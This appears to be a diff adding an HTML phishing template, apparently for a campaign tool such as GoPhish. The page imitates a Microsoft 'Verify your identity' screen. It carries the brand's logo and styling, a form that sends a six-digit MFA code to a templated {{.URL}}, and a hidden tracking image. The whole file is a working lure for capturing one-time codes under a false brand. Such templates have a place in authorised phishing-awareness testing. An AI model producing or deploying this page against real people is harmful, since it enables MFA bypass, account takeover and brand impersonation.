@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Verify your identity</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #0078d4 0%, #004578 100%); z-index: 0; }
+        .mfa-container { position: relative; z-index: 1; background: #fff; width: 440px; min-height: 380px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        .logo { margin-bottom: 16px; }
+        .logo svg { height: 24px; }
+        .user-info { display: flex; align-items: center; margin-bottom: 20px; }
+        .user-avatar { width: 32px; height: 32px; background: #0078d4; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 14px; font-weight: 600; margin-right: 10px; }
+        .user-email { font-size: 13px; color: #1b1b1b; }
+        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 12px; }
+        .description { font-size: 13px; color: #1b1b1b; margin-bottom: 24px; line-height: 1.5; }
+        .mfa-options { margin-bottom: 24px; }
+        .mfa-option { display: flex; align-items: center; padding: 12px; border: 1px solid #edebe9; cursor: pointer; margin-bottom: 8px; transition: background 0.2s; }
+        .mfa-option:hover { background: #f3f2f1; }
+        .mfa-option-icon { width: 40px; height: 40px; background: #f3f2f1; border-radius: 4px; display: flex; align-items: center; justify-content: center; margin-right: 12px; flex-shrink: 0; }
+        .mfa-option-icon svg { width: 20px; height: 20px; fill: #323130; }
+        .mfa-option-text h3 { font-size: 14px; font-weight: 600; color: #323130; margin-bottom: 2px; }
+        .mfa-option-text p { font-size: 12px; color: #605e5c; }
+        .code-input-section { margin-bottom: 24px; }
+        .code-input-section label { display: block; font-size: 13px; color: #323130; margin-bottom: 6px; }
+        .code-input-section input { width: 100%; padding: 8px 12px; border: none; border-bottom: 1px solid #8a8886; font-size: 15px; outline: none; letter-spacing: 4px; text-align: center; }
+        .code-input-section input:focus { border-bottom-color: #0078d4; }
+        .actions { display: flex; justify-content: flex-end; gap: 8px; }
+        .btn-secondary { background: transparent; color: #323130; border: 1px solid #8a8886; padding: 8px 20px; font-size: 14px; cursor: pointer; }
+        .btn-secondary:hover { background: #f3f2f1; }
+        .btn-primary { background: #0067b8; color: #fff; border: none; padding: 8px 20px; font-size: 14px; cursor: pointer; }
+        .btn-primary:hover { background: #005da6; }
+        .trouble-link { display: block; text-align: center; margin-top: 16px; font-size: 13px; color: #0067b8; text-decoration: none; }
+        .trouble-link:hover { text-decoration: underline; }
+        @media (max-width: 480px) { .mfa-container { width: 100%; min-height: 100vh; box-shadow: none; } }
+    </style>
+</head>
+<body>
+    <div class="bg-image"></div>
+    <div class="mfa-container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><path fill="#f25022" d="M0 0h11v11H0z"/><path fill="#7fba00" d="M12 0h11v11H12z"/><path fill="#00a4ef" d="M0 12h11v11H0z"/><path fill="#ffb900" d="M12 12h11v11H12z"/></svg>
+        </div>
+        <div class="user-info">
+            <div class="user-avatar">{{.FirstName}}</div>
+            <div class="user-email">{{.FromName}}</div>
+        </div>
+        <h1>Verify your identity</h1>
+        <p class="description">We need to verify your identity. Please enter the code sent to your registered device or use one of the verification methods below.</p>
+        <form action="{{.URL}}" method="POST">
+            <div class="code-input-section">
+                <label for="code">Enter code</label>
+                <input type="text" id="code" name="code" placeholder="000000" maxlength="6" required autofocus autocomplete="off">
+            </div>
+            <div class="actions">
+                <button type="button" class="btn-secondary">I can't use this method</button>
+                <button type="submit" class="btn-primary">Verify</button>
+            </div>
+        </form>
+        <a href="#" class="trouble-link">Having trouble? Sign in another way</a>
+    </div>
+    <img src="{{.Tracker}}" style="display:none" alt="">
+</body>
+</html>
